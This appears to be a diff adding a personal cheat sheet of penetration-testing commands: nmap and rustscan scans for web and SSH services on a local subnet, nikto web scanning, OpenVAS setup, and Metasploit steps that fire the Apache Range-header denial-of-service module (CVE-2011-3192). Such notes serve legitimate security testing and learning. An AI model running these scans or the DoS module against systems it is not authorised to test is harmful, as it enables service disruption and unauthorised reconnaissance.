@@ -1,0 +1,131 @@
+
+#########################
+#nmap
+
+
+#http
+
+sudo nmap -p80,443 --script http-title,http-server-header <ip>
+
+nmap --script vuln 0.0.0.0 
+
+#ssh
+nmap -p 22 --open 192.168.1.0/24
+￼
+nmap -p 22 --open -sV 192.168.1.0/24
+
+nmap -p22 --script ssh-auth-methods 192.168.1.0/24
+
+
+
+
+
+
+
+
+
+
+######################
+#nikto
+
+
+sudo apt install nikto 
+
+
+
+nmap -p- --open yourwebsite.com
+
+
+
+nikto -h http://localhost:80
+
+nikto -h http://0.0.0.0
+
+curl -I http://0.0.0.0:80
+
+
+######################
+#metasploit
+
+
+sudo snap install metasploit-framework
+
+msfconsole
+search CVE-2011-3192
+
+ use auxiliary/dos/http/apache_range_dos 
+
+
+show options
+
+set RHOSTS 0.0.0.0  
+
+set RPORT 80
+
+exploit
+
+
+
+
+set PAYLOAD auxiliary/dos/http/apache_range_dos  
+
+use auxiliary/dos/http/apache_range_dos
+set ACTION 'DOS'
+
+set RHOSTS 0.0.0.0
+
+exploit
+
+
+
+
+msfconsole
+search nginx
+
+
+
+
+###########################
+#openvas
+
+
+sudo apt install openvas
+
+sudo apt update
+sudo apt install gvm
+sudo systemctl status gvm
+
+sudo gvm-setup
+
+sudo gvm-check-setup
+ 
+
+sudo gvm-start
+
+
+
+sudo greenbone-feed-sync
+
+
+sudo openvas-setup
+
+https://localhost:9392
+
+
+
+
+sudo systemctl status  gsad.service
+
+sudo systemctl status gvmd
+
+
+docker pull greenbone/gvm
+docker run -d -p 8080:8080 greenbone/gvm
+
+
+###################################################
+#rustscan
+
+#to see  ssh in local net
+sudo rustscan -a 192.168.1.0/24 -- -sV -p 22
+
